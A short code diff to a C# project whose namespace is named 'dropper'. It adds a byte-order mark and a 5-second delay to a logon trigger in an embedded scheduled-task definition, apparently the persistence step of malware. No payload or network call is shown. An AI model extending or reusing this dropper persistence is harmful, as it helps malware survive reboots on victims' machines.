@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
@@ -26,6 +26,7 @@ namespace dropper
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
+      <Delay>PT5S</Delay>
     </LogonTrigger>
   </Triggers>
   <Principals>
